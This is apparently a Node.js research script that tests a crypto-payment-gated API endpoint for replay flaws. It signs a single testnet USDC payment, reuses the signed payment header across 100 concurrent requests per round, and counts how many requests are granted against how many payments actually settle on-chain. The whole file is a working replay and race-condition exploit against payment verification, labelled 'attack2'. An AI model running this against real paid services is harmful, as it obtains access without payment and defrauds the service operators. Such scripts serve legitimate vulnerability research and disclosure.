import { ethers } from "ethers";
import axios from "axios";
import crypto from "crypto";
import { mkdirSync, writeFileSync } from "fs";
import { TESTNET, requireEndpoint } from "./config.js";
import { signPayment } from "./signer.js";

if (!process.env.PRIVATE_KEY || !/^0x[0-9a-fA-F]{64}$/.test(process.env.PRIVATE_KEY)) {
  console.error(
    "ERROR: set PRIVATE_KEY in .env (0x + 64 hex chars) before running this script."
  );
  process.exit(1);
}
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY);
const provider = new ethers.JsonRpcProvider(TESTNET.RPC_URL);
const usdc = new ethers.Contract(TESTNET.USDC_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);

const target = requireEndpoint("endpoint2");
const URL = target.url;
const CONCURRENCY = 100;
const ROUNDS = 10;

function endpointFingerprint(url) {
  return crypto.createHash("sha256").update(url).digest("hex").slice(0, 12);
}

function addressFingerprint(address) {
  return crypto.createHash("sha256").update(address.toLowerCase()).digest("hex").slice(0, 12);
}

async function sendPaidRequest(encoded) {
  const config = {
    headers: { [target.headerName]: encoded },
    timeout: 120000,
    validateStatus: () => true,
  };

  if ((target.method || "POST").toUpperCase() === "GET") {
    return axios.get(URL, config);
  }

  return axios.post(URL, target.body, {
    ...config,
    headers: { ...config.headers, "Content-Type": "application/json" },
  });
}

async function runRound(roundNum) {
  const balBefore = await usdc.balanceOf(wallet.address);

  const { encoded } = await signPayment(wallet, {
    payTo: target.payTo,
    amount: target.amount,
    maxTimeoutSeconds: target.maxTimeoutSeconds,
    extra: { name: TESTNET.USDC_NAME, version: TESTNET.USDC_VERSION },
  });

  const promises = Array.from({ length: CONCURRENCY }, (_, i) =>
    sendPaidRequest(encoded).then(res => ({
      i,
      status: res.status,
      cache: res.headers["cf-cache-status"] || "?",
      hash: crypto.createHash("sha256").update(JSON.stringify(res.data)).digest("hex").slice(0, 12),
      blockHeight: res.data?.result || null,
      payResp: res.headers["payment-response"] ? true : false,
    })).catch(err => ({ i, status: 0, error: err.code }))
  );

  const results = await Promise.all(promises);

  await new Promise(r => setTimeout(r, 10000));
  const balAfter = await usdc.balanceOf(wallet.address);
  const spent = balBefore - balAfter;
  const settlements = Number(spent / BigInt(target.amount));

  const granted = results.filter(r => r.status === 200);
  const rejected = results.filter(r => r.status === 402);
  const errors = results.filter(r => r.status === 0);
  const other = results.filter(r => ![200, 402, 0].includes(r.status));

  const uniqueHashes = new Set(granted.map(r => r.hash));
  const uniqueHeights = new Set(granted.map(r => r.blockHeight).filter(Boolean));

  const dgr = granted.length > settlements;

  process.stdout.write(
    `  Round ${String(roundNum).padEnd(2)} | ` +
    `grants=${String(granted.length).padEnd(3)} | ` +
    `settlements=${settlements} | ` +
    `402s=${String(rejected.length).padEnd(3)} | ` +
    `errs=${String(errors.length).padEnd(3)} | ` +
    `other=${String(other.length).padEnd(3)} | ` +
    `hashes=${uniqueHashes.size} | ` +
    `heights=${uniqueHeights.size} | ` +
    `${dgr ? "DGR" : "ok"}\n`
  );

  return {
    round: roundNum,
    grants: granted.length,
    settlements,
    rejected: rejected.length,
    errors: errors.length,
    other: other.length,
    uniqueHashes: uniqueHashes.size,
    uniqueHeights: [...uniqueHeights],
    dgr,
    grantDetails: granted.map(r => ({
      index: r.i,
      blockHeight: r.blockHeight,
      hash: r.hash,
      cache: r.cache,
      payResp: r.payResp,
    })),
  };
}

async function main() {
  console.log(`=== DGR replay probe: ${ROUNDS} rounds x ${CONCURRENCY} concurrent ===\n`);
  console.log(`Target: endpoint2 (${endpointFingerprint(URL)})`);
  console.log(`Wallet fingerprint: ${addressFingerprint(wallet.address)}`);
  console.log(`Balance: ${ethers.formatUnits(await usdc.balanceOf(wallet.address), 6)} USDC\n`);

  const allResults = [];

  for (let i = 1; i <= ROUNDS; i++) {
    const r = await runRound(i);
    allResults.push(r);
    if (i < ROUNDS) await new Promise(r => setTimeout(r, 3000));
  }

  const totalGrants = allResults.reduce((s, r) => s + r.grants, 0);
  const totalSettlements = allResults.reduce((s, r) => s + r.settlements, 0);
  const dgrRounds = allResults.filter(r => r.dgr);

  console.log(`\n=== SUMMARY ===\n`);
  console.log(`Total rounds:      ${ROUNDS}`);
  console.log(`Total requests:    ${ROUNDS * CONCURRENCY}`);
  console.log(`Total grants:      ${totalGrants}`);
  console.log(`Total settlements: ${totalSettlements}`);
  console.log(`DGR rounds:        ${dgrRounds.length}/${ROUNDS}`);

  if (dgrRounds.length > 0) {
    console.log(`\nDGR detected in ${dgrRounds.length} rounds:`);
    for (const r of dgrRounds) {
      console.log(`  Round ${r.round}: ${r.grants} grants, ${r.settlements} settlements, ${r.uniqueHashes} unique hashes`);
      console.log(`    Block heights: ${r.uniqueHeights.join(", ")}`);
      console.log(`    Grant details:`);
      for (const g of r.grantDetails) {
        console.log(`      #${g.index}: height=${g.blockHeight} cache=${g.cache} payResp=${g.payResp} hash=${g.hash}`);
      }
    }
  } else {
    console.log(`\nNo DGR in any round`);
  }

  const finalBal = await usdc.balanceOf(wallet.address);
  console.log(`\nBalance: ${ethers.formatUnits(finalBal, 6)} USDC`);

  const outputPath = `results/attack2/testnet_dgr_1000.json`;
  mkdirSync("results/attack2", { recursive: true });
  writeFileSync(outputPath, JSON.stringify({
    experiment: `DGR replay probe: ${ROUNDS}x${CONCURRENCY}`,
    timestamp: new Date().toISOString(),
    target: "endpoint2",
    endpointFingerprint: endpointFingerprint(URL),
    walletFingerprint: addressFingerprint(wallet.address),
    totalGrants,
    totalSettlements,
    dgrRounds: dgrRounds.length,
    rounds: allResults,
  }, null, 2));
  console.log(`Results saved to ${outputPath}`);
}

main().catch(err => { console.error("Failed:", err.message); process.exit(1); });
